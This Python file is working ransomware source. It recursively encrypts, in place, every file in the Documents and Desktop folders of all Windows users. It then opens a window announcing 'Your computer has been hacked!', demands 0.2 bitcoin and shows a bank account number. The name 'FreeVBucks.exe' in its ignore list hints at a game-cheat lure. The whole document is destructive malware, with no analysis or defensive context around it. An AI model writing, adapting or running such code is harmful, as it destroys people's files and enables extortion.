import os
import tkinter as tk
from cryptography.fernet import Fernet


def main():
    backslash = "\\"
    base_path = "C:" + backslash + "Users"
    ignore = ['A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe', "All Users", "Default",
              "Default User", "desktop.ini", "Public"]
    key = Fernet.generate_key()
    f = Fernet(key)

    users = get_users(base_path, backslash, ignore)
    directories = set_directories(users, backslash)
    loop(directories, ignore, f)
    show_window(key.decode())


def get_users(base_path: str, backslash: str, ignore: list[str]):
    users = []
    for dir in os.listdir(base_path):
        if dir in ignore:
            continue
        else:
            users.append(base_path + backslash + dir)
    return users


def set_directories(users: list[str], backslash: str):
    directories = []
    for user in users:
        directories.append(user + backslash + "Documents")
        directories.append(user + backslash + "Desktop")
    return directories


def loop(directories: list[str], ignore: list[str], f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file in ignore:
                        continue
                    if os.path.isfile(directory + "\\" + file):
                        read(directory + "\\" + file, f)
                    if os.path.isdir(directory + "\\" + file):
                        aux_directories.append(directory + "\\" + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
        magic(content, file_path, f)


def magic(content, file_path: str, f: Fernet):
    e_content = f.encrypt(content)
    with open(file_path, "wb") as file:
        file.write(e_content)


def center_window(window):
    window.update_idletasks()
    width = window.winfo_width()
    height = window.winfo_height()
    x = (window.winfo_screenwidth() // 2) - (width // 2)
    y = (window.winfo_screenheight() // 2) - (height // 2)
    window.geometry('{}x{}+{}+{}'.format(width, height, x, y))


def show_window(key: str):
    window = tk.Tk()

    window.title("Warning!")

    window.configure()

    window.geometry("600x400")

    window.resizable(False, False)

    text1 = tk.Label(window, text="Your computer has been hacked!", fg="black", font=("Arial", 20, "bold"), anchor="w")
    text1.pack(fill="x")

    text2 = tk.Label(window,
                     text="Please send me 0.2 bitcoin and I will send you the decryptor script for your to recover your files!",
                     fg="black", font=("Arial", 10), anchor="w")
    text2.pack(fill="x")

    text3 = tk.Label(window, text='You will need to use a key in order to decrypt your files.', fg="black",
                     font=("Arial", 10), anchor="w")
    text3.pack(fill="x")

    text4 = tk.Label(window, text='Do not run the malware again, otherwise the key will be invalid!', fg="black",
                     font=("Arial", 10, "bold"), anchor="w")
    text4.pack(fill="x")

    text5 = tk.Label(window, text=f'Here is your key:', fg="black",
                     font=("Arial", 10), anchor="w")
    text5.pack(fill="x")

    keyText = tk.Text(window, height=1, borderwidth=0)
    keyText.insert(1.0, f'{key}')
    keyText.pack()

    text6 = tk.Label(window, text='Bank Account:', fg="black",
                     font=("Arial", 10), anchor="w")
    text6.pack(fill="x")

    bankAccountText = tk.Text(window, height=1, borderwidth=0)
    bankAccountText.insert(1.0, "PT50091823091280310191")
    bankAccountText.pack()

    center_window(window)

    window.mainloop()


if __name__ == "__main__":
    main()
